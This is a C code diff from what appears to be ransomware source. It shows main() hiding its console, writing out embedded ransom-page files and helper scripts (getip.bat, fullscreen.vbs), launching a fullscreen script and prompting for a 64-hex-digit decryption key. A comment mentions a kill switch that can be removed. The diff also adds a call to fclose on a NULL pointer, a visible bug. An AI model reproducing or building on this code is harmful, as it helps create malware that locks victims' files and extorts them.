@@ -56,7 +56,7 @@ bool KillSwitch() {
 }
 
 int main(int argc, char* argv[]) {
-  FreeConsole();
+  //FreeConsole();
 
   // Warning!!! This is all the security you will get.
   // Remove the line below under your own risk
@@ -75,34 +75,41 @@ int main(int argc, char* argv[]) {
   sprintf(temp, "%s\\AppData\\Local\\Temp", path);
   printf("Temp Folder in %s\n\n", temp);
 
-  if (fopen("index.htm", "r") == NULL) {
+  FILE* file = fopen("index.htm", "r");
+  if (file == NULL) {
+    fclose(file);
     size_t size;
     const char* data;
-    FILE* file;
 
     data = find_embedded_file("flag.png", &size);
     file = fopen("flag.png", "wb");
     fwrite(data, sizeof(uint8_t), size, file);
+    fclose(file);
 
     data = find_embedded_file("index.htm", &size);
     file = fopen("index.htm", "wb");
     fwrite(data, sizeof(uint8_t), size, file);
+    fclose(file);
 
     data = find_embedded_file("jester.png", &size);
     file = fopen("jester.png", "wb");
     fwrite(data, sizeof(uint8_t), size, file);
+    fclose(file);
 
     data = find_embedded_file("styles.css", &size);
     file = fopen("styles.css", "wb");
     fwrite(data, sizeof(uint8_t), size, file);
+    fclose(file);
 
     data = find_embedded_file("getip.bat", &size);
     file = fopen("getip.bat", "wb");
     fwrite(data, sizeof(uint8_t), size, file);
+    fclose(file);
 
     data = find_embedded_file("fullscreen.vbs", &size);
     file = fopen("fullscreen.vbs", "wb");
     fwrite(data, sizeof(uint8_t), size, file);
+    fclose(file);
   }
 
   if (argc == 1) {
@@ -157,10 +164,9 @@ int main(int argc, char* argv[]) {
   system("fullscreen.vbs");
 
   //AllocConsole();
-  printf("\n");
   uint8_t key[32];
   char digit1, digit2;
-  printf("\t***** FILE DECRYPTER *****\n");
+  printf("\n\t***** FILE DECRYPTER *****\n");
   printf("Enter the key (64 hexadecimal digits):\n");
   for (uint8_t i = 0; i < 32; i++) {
     do {
